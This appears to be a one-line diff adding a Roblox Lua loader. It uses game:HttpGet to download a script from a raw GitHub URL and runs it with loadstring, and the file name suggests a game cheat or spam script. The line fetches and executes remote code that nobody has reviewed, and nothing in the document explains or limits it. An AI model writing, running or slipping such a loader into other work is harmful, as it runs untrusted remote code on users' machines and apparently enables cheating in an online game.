@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/world-2-bullets-vs-everything-spam3-yf8npkeon5dlju.lua"))()
